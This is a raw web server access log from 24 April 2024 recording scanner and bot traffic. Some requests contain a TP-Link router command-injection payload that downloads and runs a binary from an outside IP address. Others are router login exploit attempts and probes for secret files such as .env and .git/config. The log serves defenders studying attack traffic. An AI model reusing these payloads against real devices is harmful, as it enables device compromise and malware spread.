179.43.191.18 - - [24/Apr/2024:05:23:51 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC7\x84]\xD3\xD8\x8A]\x89\xCA\x0F=\x08\x87 \xD3\xCC\xBB\xA7\xE4/\x93M^\xB6\x18Y\xD0\xC7~J\xD4\x80\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
179.43.191.18 - - [24/Apr/2024:05:23:51 +0000] "GET /mailman/listinfo/mailman HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.18 - - [24/Apr/2024:05:23:52 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB1\xA7\xB4\xF2\xA7\xBAP\x82\xB8b\xD7$\xE9%Q1\x87\x8D\xC0\x85\xEDM[\x86\x9C\xC1\x17\x1C:X\xB0\xB8\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
179.43.191.18 - - [24/Apr/2024:05:23:52 +0000] "GET /mailman/listinfo/mailman HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.18 - - [24/Apr/2024:05:23:52 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xE6u\xE9\x83\x92B\x81]\xEC\xBE\xB1A\x03\x1DR\xF0\x7FV\xDB`#\xAA\xA3\xAC$\xF1\xC1oa\xC5%1\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
179.43.191.18 - - [24/Apr/2024:05:23:53 +0000] "GET /mailman/listinfo/mailman HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.18 - - [24/Apr/2024:05:23:53 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03JJ\xEDf\x0E\xDCp\xFCec>\xEA\x9F\xAC&W\xEBL\x90\x92\xD5\xDA\xB0\x7F\x07\xB8\x16,$\xA8\xF2\xBA\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
179.43.191.18 - - [24/Apr/2024:05:23:53 +0000] "GET /mailman/listinfo/mailman HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.18 - - [24/Apr/2024:05:23:54 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03SE\x97\xF0\xAC\xFF\x96l\x0F\xEC\xFB9\xE7\x15\xA3#\xBC\x22n\xE8-\xBD\xD3\xFA\xE9u\xF5\xAF232\x08\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
179.43.191.18 - - [24/Apr/2024:05:23:54 +0000] "GET /mailman/listinfo/mailman HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.18 - - [24/Apr/2024:05:23:55 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xBB1\x13v" 400 154 "-" "-"
179.43.191.18 - - [24/Apr/2024:05:23:55 +0000] "GET /mailman/listinfo/mailman HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.18 - - [24/Apr/2024:05:23:55 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x031\x1F\x92[^\xC0\xC6$\xE5v\xD1\x8F8l\x15o\x1E\xE9f\xA4F\xC5\xBBae\x98\xC7\xD6.\x09\x5C\xB6\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
179.43.191.18 - - [24/Apr/2024:05:23:56 +0000] "GET /mailman/listinfo/mailman HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.18 - - [24/Apr/2024:05:23:56 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ea7\xAB\x16\x82\xDB\x9A\x0E\xB5y\xAD\x1B\xCF>)\x1Bxh\xD4\x1AC]\x12\x14\xC6\xCE\x80\xAF\x99&\xEC\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
179.43.191.18 - - [24/Apr/2024:05:23:56 +0000] "GET /mailman/listinfo/mailman HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.18 - - [24/Apr/2024:05:23:57 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x11@" 400 154 "-" "-"
179.43.191.18 - - [24/Apr/2024:05:23:57 +0000] "GET /mailman/listinfo/mailman HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.18 - - [24/Apr/2024:05:23:58 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC6\xFE\xC7i\xA8c\xD14\xF2\xE6{\xB8\xDA\x02K\xED\x13F\xBA\xEC6\x9A\xECO\x84\xEC/$P,\x8D\xD3\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
149.50.103.48 - - [24/Apr/2024:05:25:31 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.128 - - [24/Apr/2024:05:27:47 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
172.205.232.105 - - [24/Apr/2024:05:31:01 +0000] "GET /test.php?Ghost=send HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
149.50.103.48 - - [24/Apr/2024:05:46:24 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.128 - - [24/Apr/2024:05:56:42 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
146.19.24.28 - - [24/Apr/2024:05:56:53 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [24/Apr/2024:06:01:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
37.53.73.43 - - [24/Apr/2024:06:22:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
149.50.103.48 - - [24/Apr/2024:06:22:39 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
114.96.103.33 - - [24/Apr/2024:06:36:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
149.50.103.48 - - [24/Apr/2024:06:43:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
167.71.137.82 - - [24/Apr/2024:06:55:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
206.189.231.200 - - [24/Apr/2024:06:59:22 +0000] "\x16\x03\x01\x01\x06\x01\x00\x01\x02\x03\x03\xEA\xE0[EH\x015\xC9\xF3\xA7W#\xDE\x83&\x08[)\xA3`\x89\xD04O\x01\x99\xE2\xA8\x95" 400 154 "-" "-"
206.189.231.200 - - [24/Apr/2024:06:59:29 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36"
149.50.103.48 - - [24/Apr/2024:07:01:29 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.128.232.229 - - [24/Apr/2024:07:18:28 +0000] "POST /cgi-bin/param.cgi?post_network_other_conf HTTP/1.1" 301 166 "-" "-"
167.172.158.128 - - [24/Apr/2024:07:22:50 +0000] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03f\xA5G\xFA\x89\x03);\x19\x85\xAF\xEC\xA4\x9C\xAAT\xA3\xF5\xE4\xDC\xE6G\xF9x\xDEf\xCE\x03\x8E\x90\x90\xF4 \x94\xD9\xBE=\xDD\xDA\x8F\xD6\xBE\x8A\x90'\x8C\x09\x03\xB8\x88\x8C\x8A\x0C\x9D\xCB\xA3w\xCF\x1E_\xBA\xD53\xA2\x96\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
167.172.158.128 - - [24/Apr/2024:07:22:51 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
167.172.158.128 - - [24/Apr/2024:07:22:51 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA203332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.3035.98 Mobile Safari/537.3"
167.172.158.128 - - [24/Apr/2024:07:22:51 +0000] "GET /server HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:52 +0000] "GET /.vscode/sftp.json HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:52 +0000] "GET /about HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:53 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:53 +0000] "GET /v2/_catalog HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:54 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:54 +0000] "GET /server-status HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:55 +0000] "GET /login.action HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:55 +0000] "GET /_all_dbs HTTP/1.1" 301 166 "-" "Mozilla/5.0 (l9scan/2.0.435313e2132313e2333323e2038313; +https://leakix.net)"
167.172.158.128 - - [24/Apr/2024:07:22:56 +0000] "GET /.DS_Store HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:56 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:56 +0000] "GET /.git/config HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:57 +0000] "GET /s/435313e2132313e2333323e2038313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:57 +0000] "GET /config.json HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:58 +0000] "GET /telescope/requests HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
167.172.158.128 - - [24/Apr/2024:07:22:58 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [24/Apr/2024:07:23:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [24/Apr/2024:07:39:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
64.23.189.94 - - [24/Apr/2024:07:46:10 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
64.23.189.94 - - [24/Apr/2024:07:46:10 +0000] "" 400 0 "-" "-"
49.7.227.204 - - [24/Apr/2024:07:51:13 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
78.153.140.179 - - [24/Apr/2024:07:56:29 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.179 - - [24/Apr/2024:07:56:30 +0000] "\x16\x03\x01\x00\xDE\x01\x00\x00\xDA\x03\x03\x17\x096\x96\x016\xD7,\xAA\x94&%z\xAF_\xB4\x19\xB5\xC7\x92\x8A\xED7\xA8\x7F\xD7~\xF0\xF9\xF8l" 400 154 "-" "-"
149.50.103.48 - - [24/Apr/2024:08:03:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
36.134.147.75 - - [24/Apr/2024:08:21:29 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
141.98.11.128 - - [24/Apr/2024:08:22:20 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [24/Apr/2024:08:27:23 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
205.210.31.4 - - [24/Apr/2024:08:28:52 +0000] "GET / HTTP/1.1" 301 166 "http://180.233.121.154:1081/" "Xpanse, a Palo Alto Networks company, indexes customer network perimeters. If you have any questions or concerns, please reach out to: scaninfo@paloaltonetworks.com."
185.191.126.213 - - [24/Apr/2024:08:32:02 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
199.45.154.76 - - [24/Apr/2024:08:36:50 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
199.45.154.76 - - [24/Apr/2024:08:36:58 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
179.43.190.218 - - [24/Apr/2024:08:39:48 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
149.50.103.48 - - [24/Apr/2024:08:47:38 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
91.92.244.203 - - [24/Apr/2024:08:54:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0"
149.50.103.48 - - [24/Apr/2024:09:00:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.152.52.48 - - [24/Apr/2024:09:05:37 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
141.98.11.128 - - [24/Apr/2024:09:19:30 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [24/Apr/2024:09:19:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
91.92.244.203 - - [24/Apr/2024:09:22:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
198.235.24.151 - - [24/Apr/2024:09:23:33 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
172.105.77.209 - - [24/Apr/2024:09:39:04 +0000] "\xBA\xABd\xA1EZC\xDBM\x87\xEE^\xFD\xBF\x159 X\xD4>\x12\x98\xC4<\xE0\x13\xCF\x00\xAC\xA09\xD7\x90#8~\x8C\xDE\x9DReF\xBF%1Q\xE0\x9D\x06&g\xBB\x82\x95\x19\xED\x07\x14\x19ZP\x80+\x94e\xC3\xE6\x85\x06\xA4\x99\x8B\x19l\x01\xEA\x88Y\x91\x16\x95\xC4\xC8\x0EH\x02\xC7\x93g\xC14FW\x05|\xFB\xF3T\xB8\xFD\xCB\xBB)\xE3\xCE\xDD\xCD7\x9E\xEFP\x8C\xA4[V\xFD\x98\xC9l\x82\xF5\xE4\xC1d\x87X\xF7\x9B\xBF\xE8q\x12\x99&\xDB,\xF5\x87\xD7\xA8\x97j;\xE3\xEA\xA7\xB4\xB0\x02\xAD\x8DE\x9B\xAAB\x80\x0E)\xA9\xE9\xAF}\x18\x8E\xB8\x1E\x99\x04\xEF\xA8\x8C\xE8\x04\xE2\xD3\xED)1\x91\xC1\x8F\x88\x8C\x81\xF0\xDB\xA5\x88\x95H\x9BZ\xAB\xCE\xBF\xF4E%P*\x88KFY6\x9E\xE7::j\xD4\x8A\xA8V\x9A\xAA\xAB\xAF\xC3&.\xED[\x04\xC5e\x7F\x08\xBE\x8Ar\xA7\xB0\x99F\xF7\x11\xE5\xD6\x96\x8CIm+w\x1C\xFDuU\x14\x0F!x\xAC\xE8MPy\xC3\x19!2\xA0\xED\xC0}!Rw\x14\x8E\x1B\xC4\xE1\xA0\xAF+\xADKk\xC5\xE0\x5Cs\x9C\xBD\xCB" 400 154 "-" "-"
62.141.44.236 - - [24/Apr/2024:09:45:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.54"
149.50.103.48 - - [24/Apr/2024:09:45:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [24/Apr/2024:10:03:13 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
198.235.24.149 - - [24/Apr/2024:10:05:16 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03S\xD4[@\xD8\x1F\x07\xA8\x18\xA2\xC6\xE8\xF9nzK\x94\xB6\xB5}\xC6\xF8#n\xE8\x1E?}\xB8\x9F\xEDo\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
198.235.24.149 - - [24/Apr/2024:10:05:16 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03" 400 154 "-" "-"
185.224.128.43 - - [24/Apr/2024:10:19:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
66.249.69.160 - - [24/Apr/2024:10:20:05 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.160 - - [24/Apr/2024:10:20:20 +0000] "GET /ads.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
149.50.103.48 - - [24/Apr/2024:10:24:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
87.121.69.52 - - [24/Apr/2024:10:39:08 +0000] "CONNECT google.com:443 HTTP/1.1" 400 154 "-" "-"
149.50.103.48 - - [24/Apr/2024:10:42:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [24/Apr/2024:11:04:38 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.242.226.10 - - [24/Apr/2024:11:05:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
104.152.52.28 - - [24/Apr/2024:11:08:43 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
185.196.11.177 - - [24/Apr/2024:11:11:36 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.196.11.177 - - [24/Apr/2024:11:11:36 +0000] "" 400 0 "-" "-"
143.110.252.248 - - [24/Apr/2024:11:20:04 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.252.248 - - [24/Apr/2024:11:20:04 +0000] "" 400 0 "-" "-"
61.95.244.122 - - [24/Apr/2024:11:20:58 +0000] "\x03\x00\x00+&\xE0\x00\x00\x00\x00\x00Cookie: mstshash=hello" 400 154 "-" "-"
45.132.96.189 - - [24/Apr/2024:11:26:42 +0000] "GET /.git/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPad; CPU OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/76.0.3809.81 Mobile/15E148 Safari/605.1"
149.50.103.48 - - [24/Apr/2024:11:27:31 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [24/Apr/2024:11:32:28 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
143.110.252.248 - - [24/Apr/2024:11:38:47 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
109.205.213.198 - - [24/Apr/2024:11:40:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
80.94.92.60 - - [24/Apr/2024:11:41:13 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [24/Apr/2024:11:46:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
143.110.252.248 - - [24/Apr/2024:11:51:47 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.252.248 - - [24/Apr/2024:11:51:47 +0000] "" 400 0 "-" "-"
64.23.189.94 - - [24/Apr/2024:12:00:44 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
64.23.189.94 - - [24/Apr/2024:12:00:45 +0000] "" 400 0 "-" "-"
185.196.11.177 - - [24/Apr/2024:12:04:54 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.196.11.177 - - [24/Apr/2024:12:04:55 +0000] "" 400 0 "-" "-"
149.50.103.48 - - [24/Apr/2024:12:06:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
179.43.190.218 - - [24/Apr/2024:12:10:44 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
34.94.44.84 - - [24/Apr/2024:12:17:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
34.94.44.84 - - [24/Apr/2024:12:17:43 +0000] "" 400 0 "-" "-"
149.50.103.48 - - [24/Apr/2024:12:28:40 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
146.19.24.28 - - [24/Apr/2024:12:33:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [24/Apr/2024:12:49:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [24/Apr/2024:12:59:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
167.94.138.35 - - [24/Apr/2024:13:01:30 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x9D\x8C\x06\xC8\x15v\xD2(\xAD;\x1B0\xCE2\xE1\x1F|\xEAu\xE7\x81\x1C@\xE2\xDB\x9C\x03\xECbb\xE8\xED \x18\xD7K\x059o\xED\xDBR\xC4\xC9)N\x0B\xE6?\xD5V\xAEQ0\x16Hh\xED\x12\x1A\xDB\xFD\x86h\x98\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
98.96.193.34 - - [24/Apr/2024:13:18:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
98.96.193.34 - - [24/Apr/2024:13:18:22 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
149.50.103.48 - - [24/Apr/2024:13:26:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
15.204.52.61 - - [24/Apr/2024:13:36:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
213.32.39.40 - - [24/Apr/2024:13:39:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
149.50.103.48 - - [24/Apr/2024:13:43:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.142.182.92 - - [24/Apr/2024:13:46:26 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
152.42.176.18 - - [24/Apr/2024:13:47:19 +0000] "GET http://httpbin.org/ip HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
152.42.176.18 - - [24/Apr/2024:13:47:19 +0000] "CONNECT app.gangagetaways.com:443 HTTP/1.1" 400 154 "-" "-"
104.152.52.37 - - [24/Apr/2024:13:54:52 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
117.207.54.103 - - [24/Apr/2024:13:59:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
149.50.103.48 - - [24/Apr/2024:14:05:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [24/Apr/2024:14:20:00 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.148.120.92 - - [24/Apr/2024:14:34:00 +0000] "GET /.git/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; it-it) AppleWebKit/419 (KHTML, like Gecko) Safari/419.3"
149.50.103.48 - - [24/Apr/2024:14:45:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [24/Apr/2024:14:47:36 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
192.168.0.101 - - [24/Apr/2024:14:51:24 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [24/Apr/2024:14:51:26 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
